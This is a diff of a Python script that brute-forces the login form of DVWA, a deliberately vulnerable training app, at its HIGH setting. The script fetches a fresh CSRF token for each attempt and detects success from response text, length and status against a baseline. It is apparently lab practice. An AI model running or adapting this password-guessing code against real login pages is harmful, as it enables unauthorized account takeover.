@@ -25,6 +25,7 @@ passwords = [
 ]
 
 session = requests.Session()
+session.cookies.update(COOKIES)
 
 # Attempt analysis showed that CSRF token is refresh at each request
 # Each new attempt should get a new token
@@ -34,23 +35,25 @@ def get_token():
     token = soup.find("input", {"name": "user_token"})["value"]
     return token
 
-# We check the baseline payload output in order to understand what is the incorrect case
+
+# Baseline generation to understand default invalid response pattern
 def get_baseline():
     token = get_token()
 
     params = {
-        "username": "admin",
-        "password": "senha_errada_123",
+        "username": USERNAME,
+        "password": "invalid_password_123",
         "Login": "Login",
         "user_token": token
     }
 
     r = session.get(LOGIN_PAGE, params=params)
-    
+
     return {
         "length": len(r.text),
         "status": r.status_code
     }
+
 
 baseline = get_baseline()
 print(f"[i] Baseline: {baseline}")
@@ -66,15 +69,35 @@ def try_login(password):
         "user_token": token
     }
 
+    THRESHOLD_FLUCTUATION = 20
+
     r = session.get(LOGIN_PAGE, params=params)
 
+    current_length = len(r.text)
+    current_status = r.status_code
+
     # Tries to check if the system returns username or password is incorrect
-    if "Username and/or password incorrect" not in r.text:
+    # This is the first pass to check if the system returned anything different
+    content_check = "Username and/or password incorrect" not in r.text
+
+    # Additional validation using response size and status comparison
+    # In HIGH DVWA returns status 200 even for incorrect values, the status check has a different function
+    # Its main purpose is to avoid bad requests to interfere with the attack
+    length_diff = abs(current_length - baseline["length"])
+    status_diff = current_status != baseline["status"]
+
+    # Small fluctuations in lengths can happen without any guarantee of success
+    # Add a threshold to avoid fluctuations that are too small
+    significant_length_change = length_diff > THRESHOLD_FLUCTUATION
+
+    if content_check or significant_length_change or status_diff:
         print(f"[+] POSSIBLE CANDIDATE: {password}")
+        print(f"    Length: {current_length} (diff: {length_diff}) | Status: {current_status}")
         return True
 
-    print(f"[-] {password}")
+    print(f"[-] {password} | Length: {current_length}")
     return False
+
 
 for pwd in passwords:
     if try_login(pwd):
